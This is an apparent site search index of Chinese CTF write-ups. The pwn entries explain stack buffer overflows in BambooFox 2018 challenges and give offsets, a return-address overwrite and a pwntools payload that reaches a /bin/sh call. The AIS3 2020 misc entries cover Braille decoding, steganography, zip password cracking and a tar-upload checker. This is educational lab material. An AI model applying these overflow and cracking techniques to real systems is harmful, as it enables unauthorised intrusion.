\uff0c\u6240\u4ee5\u61c9\u8a72\u662f\u53ef\u4ee5 \u84cb\u5230 return address weird \u63a5\u8457\u5728\u7ffb\u4e00\u4e0b objdump \u7684\u7d50\u679c\uff0c\u767c\u73fe\u4e00\u500b\u53eb weird \u7684 function \u5176\u4e2d\u6709\u4e00\u884c CALL os/exec.Command(SB) \u53ef\u4ee5\u57f7\u884c system call \u6aa2\u67e5\u4e00\u4e0b\u5176\u4ed6\u5730\u65b9\u7684\u7a0b\u5f0f\u78bc\uff0c\u767c\u73fe main.main \u6709\u547c\u53eb\u5230 \u4f7f\u7528 gdb \u5f37\u5236\u8b93 cmp \u7b26\u5408\u5f8c\u8df3\u904e\u53bb\u5f8c\u767c\u73fe\u9019\u500b system call \u7684\u53c3\u6578\u662f /bin/sh \u6240\u4ee5\u53ea\u8981\u9032\u5165\u5230 weird \u61c9\u8a72\u5c31\u80fd\u62ff\u5230 shell \u4e86 \u89e3\u6cd5 payload \u5148\u96a8\u4fbf\u8f38\u5165\u4f86\u9020\u6210 segmenataion fault\uff0c\u78ba\u5b9a\u7a0b\u5f0f\u6703\u7522\u751f buffer overflow\uff0c\u4e14\u662f\u6b7b\u5728 return addresss \u932f\u8aa4 \u8a08\u7b97\u4e00\u4e0b payload \u662f 224 weird \u56e0\u70ba\u53ef\u4ee5\u84cb\u5230 return address\uff0c\u4e5f\u5c31\u662f\u8aaa\u53ef\u4ee5\u4efb\u610f\u6307\u5b9a\u8981\u8df3\u5230\u54ea\u88e1\uff0c\u90a3\u5c31\u628a return address \u6539\u6210 weird \u7684\u958b\u982d 0x4a2650 \u5c31\u53ef\u4ee5\u8df3\u904e\u53bb\u57f7\u884c\u56c9 \u57f7\u884c\u5f8c\u679c\u7136\u5c31\u6210\u529f\u62ff\u5230 shell \u4e86 OwO","title":"infant-gotoheaven"},{"location":"Writeups/2018/BambooFox_CTF/infant-gotoheaven/#infant-gotoheaven","text":"Challenge Link: infant-gotoheaven Category: pwn Writeup: infant-gotoheaven What's the token to heaven? nc bamboofox.cs.nctu.edu.tw 58796 infant-gotoheaven.zip","title":"infant-gotoheaven"},{"location":"Writeups/2018/BambooFox_CTF/infant-gotoheaven/#go-binanry","text":"\u958b\u59cb\u524d\u5148\u8b1b\u4e00\u4e0b\u5206\u6790 Go \u7684 binanry \u6642\u53ef\u4ee5\u7528\u5230\u7684\u4e00\u4e9b\u5de5\u5177\u4ee5\u53ca\u8a23\u7ac5","title":"Go binanry \u5c0f\u8a23\u7ac5"},{"location":"Writeups/2018/BambooFox_CTF/infant-gotoheaven/#go-tool-objdump","text":"go tool \u662f go \u7684\u7de8\u8b6f\u5668\u5167\u5efa\u7684\u5de5\u5177\u96c6\uff0c\u5176\u4e2d\u4e5f\u6709 objdump \u53ef\u4ee5\u4f7f\u7528 \u4f7f\u7528\u9019\u500b\u5de5\u5177\u7684\u8a71\u53ef\u4ee5\u770b\u5230 source code \u4e2d\u7684 \u884c\u6578 \u5c0d\u61c9\u5230\u7684 assembly go tool objdump infant-gotoheaven | less","title":"go tool objdump"},{"location":"Writeups/2018/BambooFox_CTF/infant-gotoheaven/#gdb","text":"\u4f7f\u7528 gdb \u8ffd\u8e64\u6642\uff0c\u5728\u57f7\u884c\u5230 main \u4e4b\u524d\u6703\u7d93\u904e\u4e00\u5927\u5806\u7684\u7a0b\u5e8f \u5728\u8ffd\u8e64 C \u7684 binanry \u6642\uff0c\u901a\u5e38\u6703\u4f7f\u7528 b main \u4f86\u8a2d\u65b7\u9ede\u5728 main \u7684\u4e00\u958b\u59cb \u7531\u4e0a\u9762 go tool objdump \u7684\u5716\u53ef\u4ee5\u770b\u5230\uff0cGo \u7684 main \u53eb\u505a main.main \u6240\u4ee5\u8981\u4f7f\u7528 b main.main","title":"gdb"},{"location":"Writeups/2018/BambooFox_CTF/infant-gotoheaven/#_1","text":"\u9019\u652f\u7a0b\u5f0f\u53ef\u4ee5\u8b93\u4f7f\u7528\u8005\u8f38\u5165\u4e00\u4e32\u5b57\u4e32 % ./infant-gotoheaven Give me your text : aaaaaaaaaaaaaaaaaaaaaaaaaaaaa","title":"\u89c0\u5bdf"},{"location":"Writeups/2018/BambooFox_CTF/infant-gotoheaven/#buffer-overflow","text":"\u901a\u5e38\u770b\u5230\u9019\u985e\u984c\u76ee\u5927\u6982\u90fd\u662f buffer overflow \uff0c\u6240\u4ee5\u5148\u8a66\u4e00\u4e0b\u80fd\u4e0d\u80fd\u89f8\u767c segmentation fault % ./infant-gotoheaven Give me your text : aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa unexpected fault address 0x0 fatal error: fault [signal SIGSEGV: segmentation violation code=0x80 addr=0x0 pc=0x4a263e] goroutine 1 [running]: runtime.throw(0x4d8780, 0x5) /usr/local/go/src/runtime/panic.go:605 +0x95 fp=0xc420043f28 sp=0xc420043f08 pc=0x427a05 runtime.sigpanic() /usr/local/go/src/runtime/signal_unix.go:374 +0x227 fp=0xc420043f78 sp=0xc420043f28 pc=0x43d037 main.main() /home/frozenkp/Downloads/gobin/infant-gotoheaven/infant-gotoheaven.go:27 +0x1ee fp=0xc420043f80 sp=0xc420043f78 pc=0x4a263e \u6700\u5f8c\u4e00\u884c\u6709\u5beb\u5230\u6b7b\u5728 infant-gotoheaven.go:27 \u7528 objdump \u770b\u4e00\u4e0b\u767c\u73fe\u662f\u6b7b\u5728 ret \uff0c\u6240\u4ee5\u61c9\u8a72\u662f\u53ef\u4ee5 \u84cb\u5230 return address","title":"Buffer overflow"},{"location":"Writeups/2018/BambooFox_CTF/infant-gotoheaven/#weird","text":"\u63a5\u8457\u5728\u7ffb\u4e00\u4e0b objdump \u7684\u7d50\u679c\uff0c\u767c\u73fe\u4e00\u500b\u53eb weird \u7684 function \u5176\u4e2d\u6709\u4e00\u884c CALL os/exec.Command(SB) \u53ef\u4ee5\u57f7\u884c system call \u6aa2\u67e5\u4e00\u4e0b\u5176\u4ed6\u5730\u65b9\u7684\u7a0b\u5f0f\u78bc\uff0c\u767c\u73fe main.main \u6709\u547c\u53eb\u5230 \u4f7f\u7528 gdb \u5f37\u5236\u8b93 cmp \u7b26\u5408\u5f8c\u8df3\u904e\u53bb\u5f8c\u767c\u73fe\u9019\u500b system call \u7684\u53c3\u6578\u662f /bin/sh \u6240\u4ee5\u53ea\u8981\u9032\u5165\u5230 weird \u61c9\u8a72\u5c31\u80fd\u62ff\u5230 shell \u4e86","title":"weird"},{"location":"Writeups/2018/BambooFox_CTF/infant-gotoheaven/#_2","text":"","title":"\u89e3\u6cd5"},{"location":"Writeups/2018/BambooFox_CTF/infant-gotoheaven/#payload","text":"\u5148\u96a8\u4fbf\u8f38\u5165\u4f86\u9020\u6210 segmenataion fault\uff0c\u78ba\u5b9a\u7a0b\u5f0f\u6703\u7522\u751f buffer overflow\uff0c\u4e14\u662f\u6b7b\u5728 return addresss \u932f\u8aa4 \u8a08\u7b97\u4e00\u4e0b payload \u662f 224","title":"payload"},{"location":"Writeups/2018/BambooFox_CTF/infant-gotoheaven/#weird_1","text":"\u56e0\u70ba\u53ef\u4ee5\u84cb\u5230 return address\uff0c\u4e5f\u5c31\u662f\u8aaa\u53ef\u4ee5\u4efb\u610f\u6307\u5b9a\u8981\u8df3\u5230\u54ea\u88e1\uff0c\u90a3\u5c31\u628a return address \u6539\u6210 weird \u7684\u958b\u982d 0x4a2650 \u5c31\u53ef\u4ee5\u8df3\u904e\u53bb\u57f7\u884c\u56c9 \u57f7\u884c\u5f8c\u679c\u7136\u5c31\u6210\u529f\u62ff\u5230 shell \u4e86 OwO","title":"weird"},{"location":"Writeups/2018/BambooFox_CTF/water-impossible/","text":"water-impossible Challenge Link: water-impossible Category: pwn Writeup: water-impossible Welcome !! Challenger ~ Here is a simple challenge for you. Try to find the key to pass. nc bamboofox.cs.nctu.edu.tw 58799 water-impossible.zip \u9808\u5177\u5099\u7684\u77e5\u8b58 Stack stack \u662f\u7a0b\u5f0f\u5728\u57f7\u884c\u4e2d\u7528\u4f86\u5132\u5b58\u8cc7\u6599\u7684\u7d50\u69cb\uff0c\u5132\u5b58\u7684\u8cc7\u6599\u5982 \u66ab\u6642\u7684\u503c return address \u5340\u57df\u8b8a\u6578 ... rsp rsp \u662f\u7528\u4f86\u5132\u5b58 stack \u6240\u5728\u4f4d\u7f6e\u7684\u66ab\u5b58\u5668 \u5340\u57df\u8b8a\u6578 \u5ba3\u544a\u5340\u57df\u8b8a\u6578\u6642\uff0c\u6703\u5c07\u503c\u5b58\u5728 stack \u4e0a \u5047\u8a2d\u5ba3\u544a\u5169\u500b\u8b8a\u6578 a, b int a = 1 ; int b = 2 ; \u5ba3\u544a a \u6642\uff0cstack \u72c0\u614b\u5982\u4e0b +----------+ 0x7fffffffe728 low | a = 1 | +----------+ 0x7fffffffe730 | ... | +----------+ 0x7fffffffe738 high \u5ba3\u544a b \u6642\uff0cstack \u72c0\u614b\u5982\u4e0b +----------+ 0x7fffffffe720 low | b = 2 | +----------+ 0x7fffffffe728 | a = 1 | +----------+ 0x7fffffffe730 | ... | +----------+ 0x7fffffffe738 high \u7576 push \u503c\u9032 stack \u6642\uff0c rsp \u7684\u4f4d\u7f6e\u6703\u6e1b\u8db3\u5920\u7684\u5927\u5c0f\uff0c\u8b93\u65b0\u7684\u503c\u53ef\u4ee5\u586b\u9032\u4f86\uff0c\u6240\u4ee5\u5f8c\u9032\u4f86\u7684 b \u53cd\u800c\u6703\u5b58\u5728\u8f03\u4f4e\u4f4d\u7684\u5730\u65b9 Buffer overflow \u5728\u8b80\u53d6\u8f38\u5165\u7684\u6642\u5019\uff0c\u8f38\u5165\u7684\u5927\u5c0f\u8d85\u904e\u8b8a\u6578\u7684\u5927\u5c0f\uff0c\u6b64\u6642\u591a\u7684\u90e8\u4efd\u6703\u8d85\u8d8a\u5340\u57df\u8b8a\u6578\u7684\u4f4d\u5740\uff0c\u9032\u800c\u84cb\u5230 stack \u4e0a\u7684\u5176\u4ed6\u4f4d\u7f6e \u5047\u8a2d\u6709\u4e00\u7a0b\u5f0f\u5982\u4e0b int key = 0xdeadbeef ; char buf [ 16 ] = { 0 }; gets ( buf ); \u5ba3\u544a\u5f8c stack \u72c0\u614b\u5982\u4e0b +----------------+ 0x7fffffffe720 low <-----+ | 0x0 | | +----------------+ 0x7fffffffe728 | buf[16] | 0x0 | | +----------------+ 0x7fffffffe730 <-----+-----+ | 0xdeadbeef | | key +----------------+ 0x7fffffffe738 high <-----------+ \u56e0\u70ba gets \u6c92\u6709\u9650\u5236\u8f38\u5165\u7684\u9577\u5ea6\uff0c\u56e0\u6b64\u53ef\u4ee5\u8f38\u5165\u8d85\u904e buf \u9577\u5ea6\uff0c\u6b64\u6642\u591a\u7684\u90e8\u4efd\u5c31\u6703\u84cb\u5230 stack \u5176\u4ed6\u90e8\u4efd \u4f8b\u5982\u8f38\u5165 aaaaaaaabbbbbbbbcccccccc +----------------+ 0x7fffffffe720 low <-----+ | aaaaaaaa | | +----------------+ 0x7fffffffe728 | buf[16] | bbbbbbbb | | +----------------+ 0x7fffffffe730 <-----+-----+ | cccccccc | | key +----------------+ 0x7fffffffe738 high <-----------+ \u539f\u672c key \u5b58\u7684\u4f4d\u7f6e\u5c31\u88ab buf \u7684\u8f38\u5165\u84cb\u6389\u4e86 \u89c0\u5bdf \u89c0\u5bdf\u4e00\u4e0bcode\u5f8c\u53ef\u4ee5\u767c\u73fe\u89f8\u767c system(\"/bin/sh\") \u7684\u689d\u4ef6\u70ba (int)token == 6666 \u800ctoken\u662f\u4e00\u500b\u5ba3\u544a\u5728 main \u4f46\u5f9e\u672a\u88ab\u4f7f\u7528\u5230\u7684\u8b8a\u6578 if (( int ) token == 6666 ){ printf ( \"wow, That's impossible to touch this token ?!\" ); system ( \"/bin/sh\" ); } \u53e6\u5916\u53ef\u4ee5\u88abexploit\u7684\u90e8\u4efd\u70ba read() \u7684 buffer overflow char key [ 16 ]; read ( 0 , key , 40 ); \u901a\u5e38\u9019\u985e\u984c\u76ee\u53ef\u80fd\u7684\u4f5c\u6cd5\u6709\u4ee5\u4e0b\u5169\u7a2e \u84cb return \u5982\u679cstack\u4e00\u76f4\u5f80\u4e0b\u84cb\u7684\u8a71\u53ef\u4ee5\u78b0\u5230 return \uff0c\u90a3\u5c31\u76f4\u63a5\u8df3\u5230 system(\"/bin/sh\") \u5c31\u597d\u4e86 \u4e0d\u904e\u9019\u984c\u6709\u9650\u5236\u9577\u5ea640\uff0c\u6240\u4ee5\u6c92\u8fa6\u6cd5\u84cb\u5230return \u84cb token \u56e0\u70ba token \u4e5f\u662f\u5ba3\u544a\u5728stack\u4e0a\uff0c\u61c9\u8a72\u53ef\u4ee5\u627e\u5230 token \u7684\u4f4d\u7f6e\u5f8c\u76f4\u63a5\u84cb\u6210\u60f3\u8981\u7684\u503c \u89e3\u6cd5 \u4ee5\u4e0b\u89e3\u6cd5\u662f\u7528\u84cbtoken\u7684\u65b9\u6cd5 \u627e paylod \u9577\u5ea6 \u5148\u8f38\u5165\u4ee5\u4e0b\u5b57\u4e32\u4f86\u5b9a\u4f4d AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDEEEEEEEEFFFFFFFF \u5230 if((int)token == 6666) \u6642 stack \u72c0\u614b\u5982\u4e0b \u4e0a\u5716\u53ef\u4ee5\u770b\u5230 token \u7684\u4f4d\u7f6e\u4ee5\u53ca\u5167\u5bb9\u662f [rbp-0x4] : 0x7fffffffdf1c (\"DDDDEEEEEEEE0\u0622\\367\\377\\177\") \u7531\u6b64\u53ef\u77e5\u5230 token \u4e4b\u524d\uff0c\u6240\u9700\u8981\u7684 payload \u9577\u5ea6\u662f 28 \uff0c\u4e5f\u5c31\u662f AAAAAAAABBBBBBBBCCCCCCCCDDDD \u84cbtoken\u7684\u503c \u56e0\u70ba\u9019\u652f\u7a0b\u5f0f\u662f\u5728 64\u4f4d\u5143 \u7684\u74b0\u5883\u7de8\u8b6f\u7684\uff0c\u6240\u4ee5\u9001\u7684\u6642\u5019\u8981\u7d6664\u4f4d\u5143\u7684\u4f4d\u5740\uff0c\u4f7f\u7528 pwntool \u7684\u8a71\u53ea\u8981\u7528 p64() \u5c31\u53ef\u4ee5\u56c9 r . sendline ( payload + p64 ( 0x1a0a ))","title":"water-impossible"},{"location":"Writeups/2018/BambooFox_CTF/water-impossible/#water-impossible","text":"Challenge Link: water-impossible Category: pwn Writeup: water-impossible Welcome !! Challenger ~ Here is a simple challenge for you. Try to find the key to pass. nc bamboofox.cs.nctu.edu.tw 58799 water-impossible.zip","title":"water-impossible"},{"location":"Writeups/2018/BambooFox_CTF/water-impossible/#_1","text":"","title":"\u9808\u5177\u5099\u7684\u77e5\u8b58"},{"location":"Writeups/2018/BambooFox_CTF/water-impossible/#stack","text":"stack \u662f\u7a0b\u5f0f\u5728\u57f7\u884c\u4e2d\u7528\u4f86\u5132\u5b58\u8cc7\u6599\u7684\u7d50\u69cb\uff0c\u5132\u5b58\u7684\u8cc7\u6599\u5982 \u66ab\u6642\u7684\u503c return address \u5340\u57df\u8b8a\u6578 ...","title":"Stack"},{"location":"Writeups/2018/BambooFox_CTF/water-impossible/#rsp","text":"rsp \u662f\u7528\u4f86\u5132\u5b58 stack \u6240\u5728\u4f4d\u7f6e\u7684\u66ab\u5b58\u5668","title":"rsp"},{"location":"Writeups/2018/BambooFox_CTF/water-impossible/#_2","text":"\u5ba3\u544a\u5340\u57df\u8b8a\u6578\u6642\uff0c\u6703\u5c07\u503c\u5b58\u5728 stack \u4e0a \u5047\u8a2d\u5ba3\u544a\u5169\u500b\u8b8a\u6578 a, b int a = 1 ; int b = 2 ; \u5ba3\u544a a \u6642\uff0cstack \u72c0\u614b\u5982\u4e0b +----------+ 0x7fffffffe728 low | a = 1 | +----------+ 0x7fffffffe730 | ... | +----------+ 0x7fffffffe738 high \u5ba3\u544a b \u6642\uff0cstack \u72c0\u614b\u5982\u4e0b +----------+ 0x7fffffffe720 low | b = 2 | +----------+ 0x7fffffffe728 | a = 1 | +----------+ 0x7fffffffe730 | ... | +----------+ 0x7fffffffe738 high \u7576 push \u503c\u9032 stack \u6642\uff0c rsp \u7684\u4f4d\u7f6e\u6703\u6e1b\u8db3\u5920\u7684\u5927\u5c0f\uff0c\u8b93\u65b0\u7684\u503c\u53ef\u4ee5\u586b\u9032\u4f86\uff0c\u6240\u4ee5\u5f8c\u9032\u4f86\u7684 b \u53cd\u800c\u6703\u5b58\u5728\u8f03\u4f4e\u4f4d\u7684\u5730\u65b9","title":"\u5340\u57df\u8b8a\u6578"},{"location":"Writeups/2018/BambooFox_CTF/water-impossible/#buffer-overflow","text":"\u5728\u8b80\u53d6\u8f38\u5165\u7684\u6642\u5019\uff0c\u8f38\u5165\u7684\u5927\u5c0f\u8d85\u904e\u8b8a\u6578\u7684\u5927\u5c0f\uff0c\u6b64\u6642\u591a\u7684\u90e8\u4efd\u6703\u8d85\u8d8a\u5340\u57df\u8b8a\u6578\u7684\u4f4d\u5740\uff0c\u9032\u800c\u84cb\u5230 stack \u4e0a\u7684\u5176\u4ed6\u4f4d\u7f6e \u5047\u8a2d\u6709\u4e00\u7a0b\u5f0f\u5982\u4e0b int key = 0xdeadbeef ; char buf [ 16 ] = { 0 }; gets ( buf ); \u5ba3\u544a\u5f8c stack \u72c0\u614b\u5982\u4e0b +----------------+ 0x7fffffffe720 low <-----+ | 0x0 | | +----------------+ 0x7fffffffe728 | buf[16] | 0x0 | | +----------------+ 0x7fffffffe730 <-----+-----+ | 0xdeadbeef | | key +----------------+ 0x7fffffffe738 high <-----------+ \u56e0\u70ba gets \u6c92\u6709\u9650\u5236\u8f38\u5165\u7684\u9577\u5ea6\uff0c\u56e0\u6b64\u53ef\u4ee5\u8f38\u5165\u8d85\u904e buf \u9577\u5ea6\uff0c\u6b64\u6642\u591a\u7684\u90e8\u4efd\u5c31\u6703\u84cb\u5230 stack \u5176\u4ed6\u90e8\u4efd \u4f8b\u5982\u8f38\u5165 aaaaaaaabbbbbbbbcccccccc +----------------+ 0x7fffffffe720 low <-----+ | aaaaaaaa | | +----------------+ 0x7fffffffe728 | buf[16] | bbbbbbbb | | +----------------+ 0x7fffffffe730 <-----+-----+ | cccccccc | | key +----------------+ 0x7fffffffe738 high <-----------+ \u539f\u672c key \u5b58\u7684\u4f4d\u7f6e\u5c31\u88ab buf \u7684\u8f38\u5165\u84cb\u6389\u4e86","title":"Buffer overflow"},{"location":"Writeups/2018/BambooFox_CTF/water-impossible/#_3","text":"\u89c0\u5bdf\u4e00\u4e0bcode\u5f8c\u53ef\u4ee5\u767c\u73fe\u89f8\u767c system(\"/bin/sh\") \u7684\u689d\u4ef6\u70ba (int)token == 6666 \u800ctoken\u662f\u4e00\u500b\u5ba3\u544a\u5728 main \u4f46\u5f9e\u672a\u88ab\u4f7f\u7528\u5230\u7684\u8b8a\u6578 if (( int ) token == 6666 ){ printf ( \"wow, That's impossible to touch this token ?!\" ); system ( \"/bin/sh\" ); } \u53e6\u5916\u53ef\u4ee5\u88abexploit\u7684\u90e8\u4efd\u70ba read() \u7684 buffer overflow char key [ 16 ]; read ( 0 , key , 40 ); \u901a\u5e38\u9019\u985e\u984c\u76ee\u53ef\u80fd\u7684\u4f5c\u6cd5\u6709\u4ee5\u4e0b\u5169\u7a2e","title":"\u89c0\u5bdf"},{"location":"Writeups/2018/BambooFox_CTF/water-impossible/#return","text":"\u5982\u679cstack\u4e00\u76f4\u5f80\u4e0b\u84cb\u7684\u8a71\u53ef\u4ee5\u78b0\u5230 return \uff0c\u90a3\u5c31\u76f4\u63a5\u8df3\u5230 system(\"/bin/sh\") \u5c31\u597d\u4e86 \u4e0d\u904e\u9019\u984c\u6709\u9650\u5236\u9577\u5ea640\uff0c\u6240\u4ee5\u6c92\u8fa6\u6cd5\u84cb\u5230return","title":"\u84cb return"},{"location":"Writeups/2018/BambooFox_CTF/water-impossible/#token","text":"\u56e0\u70ba token \u4e5f\u662f\u5ba3\u544a\u5728stack\u4e0a\uff0c\u61c9\u8a72\u53ef\u4ee5\u627e\u5230 token \u7684\u4f4d\u7f6e\u5f8c\u76f4\u63a5\u84cb\u6210\u60f3\u8981\u7684\u503c","title":"\u84cb token"},{"location":"Writeups/2018/BambooFox_CTF/water-impossible/#_4","text":"\u4ee5\u4e0b\u89e3\u6cd5\u662f\u7528\u84cbtoken\u7684\u65b9\u6cd5","title":"\u89e3\u6cd5"},{"location":"Writeups/2018/BambooFox_CTF/water-impossible/#paylod","text":"\u5148\u8f38\u5165\u4ee5\u4e0b\u5b57\u4e32\u4f86\u5b9a\u4f4d AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDEEEEEEEEFFFFFFFF \u5230 if((int)token == 6666) \u6642 stack \u72c0\u614b\u5982\u4e0b \u4e0a\u5716\u53ef\u4ee5\u770b\u5230 token \u7684\u4f4d\u7f6e\u4ee5\u53ca\u5167\u5bb9\u662f [rbp-0x4] : 0x7fffffffdf1c (\"DDDDEEEEEEEE0\u0622\\367\\377\\177\") \u7531\u6b64\u53ef\u77e5\u5230 token \u4e4b\u524d\uff0c\u6240\u9700\u8981\u7684 payload \u9577\u5ea6\u662f 28 \uff0c\u4e5f\u5c31\u662f AAAAAAAABBBBBBBBCCCCCCCCDDDD","title":"\u627e paylod \u9577\u5ea6"},{"location":"Writeups/2018/BambooFox_CTF/water-impossible/#token_1","text":"\u56e0\u70ba\u9019\u652f\u7a0b\u5f0f\u662f\u5728 64\u4f4d\u5143 \u7684\u74b0\u5883\u7de8\u8b6f\u7684\uff0c\u6240\u4ee5\u9001\u7684\u6642\u5019\u8981\u7d6664\u4f4d\u5143\u7684\u4f4d\u5740\uff0c\u4f7f\u7528 pwntool \u7684\u8a71\u53ea\u8981\u7528 p64() \u5c31\u53ef\u4ee5\u56c9 r . sendline ( payload + p64 ( 0x1a0a ))","title":"\u84cbtoken\u7684\u503c"},{"location":"Writeups/2020/AIS3_pre-exam/","text":"AIS3 pre-exam 2020 Misc \u5b98\u65b9 Writeup \ud83d\udca4 Piquero Description I can\u2019t see the flag. Where is it? Solution \u9019\u984c\u662f\u7de8\u78bc\u7684\u984c\u76ee\uff0c\u7528\u7684\u662f Braille\uff0c\u4e5f\u5c31\u662f\u751f\u6d3b\u4e2d\u5e38\u898b\u7684\u76f2\u4eba\u9ede\u5b57\uff0c\u9019\u984c\u6703\u9047\u5230\u7684\u554f\u984c\u662f Braille \u6709\u591a\u7a2e\u8a9e\u7cfb\uff0c\u6703\u9700\u8981\u63a8\u6572\u4e00\u4e0b\uff0c\u4e0d\u904e Flag \u662f\u82f1\u3001\u6578\u3001\u7b26\u865f\u7d44\u6210\uff0c\u4e14\u7db2\u8def\u4e0a\u591a\u6578\u5de5\u5177\u4e5f\u662f\u4ee5\u82f1\u6587\u70ba\u4e3b\uff0c\u61c9\u8a72\u883b\u5bb9\u6613\u8a66\u51fa\u4f86\u7684(?)\u3002 \u89e3\u6cd5\u7684\u90e8\u5206\uff0c\u53ea\u8981\u53c3\u8003\u82f1\u6587\u7248 wiki \u5c31\u53ef\u4ee5\u9010\u5b57\u89e3\u958b\u4e86\uff0c\u89e3\u7b54\u5982\u4e0b\u5716\uff1a Note \u9019\u984c\u7684\u96e3\u5ea6\u5b9a\u4f4d\u662f\u6700\u7c21\u55ae\u7684\uff0c\u60f3\u883b\u4e45\u8981\u51fa\u4ec0\u9ebc\u984c\u76ee\u7684\uff0c\u5f8c\u4f86\u770b\u4e86\u7db2\u8def\u4e0a\u5404\u7a2e\u77e5\u8b58\u578b\u983b\u9053\uff0c\u525b\u597d\u770b\u5230 \u557e\u557e\u978b\u5728\u8b1b\u76f2\u4eba\u9ede\u5b57 \uff0c\u89ba\u5f97\u633a\u6709\u8da3\u7684\uff0c\u800c\u4e14\u662f\u540c\u5b78\u65e5\u5e38\u751f\u6d3b\u4e2d\u90fd\u898b\u904e\uff0c\u537b\u6c92\u6ce8\u610f\u904e\u7684\u7de8\u78bc\uff0c\u5c31\u51fa\u4e86\u9019\u984c\u3002 \u5728\u6bd4\u8cfd\u904e\u7a0b\u4e2d\uff0c\u5f88\u591a\u540c\u5b78\u90fd\u4f7f\u7528\u7dda\u4e0a\u5de5\u5177\u4f86\u89e3\uff0c\u5f97\u5230\u985e\u4f3c\u4e0b\u5716\u7684\u7d50\u679c\uff0c\u96d6\u7136\u8aaa\u770b\u5230\u9019\u500b\u518d\u901a\u9748\u4e00\u4e0b\u5c31\u77e5\u9053 Flag \u4e86(\u4e5f\u78ba\u5be6\u6709\u4e9b\u540c\u5b78\u662f\u7528\u901a\u9748\u7684)\uff0c\u4e0d\u904e\u5728\u9019\u500b\u7d50\u679c\u4e2d\u53ef\u4ee5\u767c\u73fe\uff0c AIS \u524d\u9762\u90fd\u6709\u4e00\u500b\u7b26\u865f\uff0c\u4e14\u6bd4\u8cfd\u6709\u516c\u544a\u683c\u5f0f\u70ba AIS3{...} \uff0c\u53ef\u63a8\u6e2c\u8a72\u7b26\u865f\u70ba\u5927\u5beb\u5b57\u6bcd\u7684\u524d\u7db4\u7b26\u865f\uff0c\u800c AIS3 \u5f8c\u65b9\u7684\u5169\u500b\u7b26\u865f\u5728\u524d\u5f8c\u90fd\u6709\uff0c\u61c9\u70ba {} \uff0c\u53ef\u5f97 AIS3{I-feel-sleepy-Good-Night!!!} \uff0c\u4f46\u9019\u9084\u662f\u932f\u7684\uff0c\u4e4b\u5f8c\u89c0\u5bdf\u4e00\u4e0b\u4e00\u822c Flag \u7684\u5beb\u6cd5\uff0c\u61c9\u8a72\u5c31\u53ef\u4ee5\u767c\u73fe\u8981\u5c07 - \u6539\u6210 _ \u4e86\u3002 \ud83d\udc25 Karuego Description Students who fail to summon will be dropped out. Solution \u5148\u7528 binwalk \u6383\u4e00\u4e0b\u53ef\u4ee5\u767c\u73fe\u5716\u7247\u5f8c\u9762\u6709\u4e00\u500b\u52a0\u5bc6\u904e\u5f8c\u7684\u58d3\u7e2e\u6a94\uff0c\u63a5\u8457\u7528 lsb \u6383\u4e00\u4e0b\u539f\u5716\u53ef\u4ee5\u627e\u5230 The key is : lafire \u7684\u5b57\u4e32\uff0c\u4f7f\u7528 lafire \u4f5c\u70ba\u5bc6\u78bc\u89e3\u958b\u58d3\u7e2e\u6a94\u5373\u53ef\u5f97\u5230\u4e0b\u5716\u3002 Note \u9019\u984c\u662f\u60f3\u51fa\u7c21\u55ae\u7684 stego \u984c\uff0c\u6240\u4ee5\u7d9c\u5408\u4e86\u5404\u7a2e\u5716\u7247\u5e38\u7528\u7684\u6280\u5de7\u4f86\u51fa\u984c\uff0c\u4e0a\u8ff0\u89e3\u6cd5\u53ea\u662f\u5176\u4e2d\u4e00\u7a2e\uff0c\u5176\u5be6\u52a0\u5bc6\u7684\u58d3\u7e2e\u6a94\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528 rockyou.txt \u6216\u662f John the Ripper \u7b49\u5de5\u5177\u66b4\u529b\u7834\u89e3\uff0c\u53e6\u5916\u58d3\u7e2e\u6a94\u7684\u6a94\u6848\u7d50\u69cb\u6c92\u6709\u52a0\u5bc6\uff0c\u53ef\u4ee5\u5728\u5176\u4e2d\u627e\u5230\u4e00\u5f35\u5716\u7247 ( 3a66fa5887bcb740438f1fb49f78569cb56e9233_hq.jpg )\uff0c\u641c\u5c0b\u4e00\u4e0b\u9019\u5f35\u5716\u7684\u539f\u5716\uff0c\u518d\u4f7f\u7528 pkcrack \u505a known-plaintext attack \u4e5f\u53ef\u4ee5\u89e3\u958b\u3002 \ud83d\udc7f Shichirou Description Don\u2019t cheat!!! #!/usr/bin/env python3 import os import sys import tempfile import subprocess import resource resource . setrlimit ( resource . RLIMIT_FSIZE , ( 65536 , 65536 )) os . chdir ( os . environ [ 'HOME' ]) size = int ( sys . stdin . readline () . rstrip ( ' \\r\\n ' )) if size > 65536 : print ( 'File is too large.' ) quit () data = sys . stdin . read ( size ) with tempfile . NamedTemporaryFile ( mode = 'w+' , suffix = '.tar' , delete = True , dir = '.' ) as tarf : with tempfile . TemporaryDirectory ( dir = '.' ) as outdir : tarf . write ( data ) tarf . flush () try : subprocess . check_output ([ '/bin/tar' , '-xf' , tarf . name , '-C' , outdir ]) except : print ( 'Broken tar file.' ) raise try : a = subprocess . check_output ([ '/usr/bin/sha1sum' , 'flag.txt' ]) b = subprocess . check_output ([ '/usr/bin/sha1sum' , os . path . join ( outdir , 'guess.txt' )]) a = a . split ( b ' ' )[ 0 ] b = b . split ( b ' ' )[ 0 ] assert len ( a ) == 40 and len ( b ) == 40 if a != b : raise Exception ( 'sha1' ) except : print ( 'Different.' ) raise print ( open ( 'flag.txt' , 'r' ) . readline ()) Solution \u9019\u984c\u662f\u8981\u4e0a\u50b3\u4e00\u500b tar \u6a94\uff0c\u88e1\u9762\u8981\u6709\u5beb\u6709 Flag \u7684 guess.txt 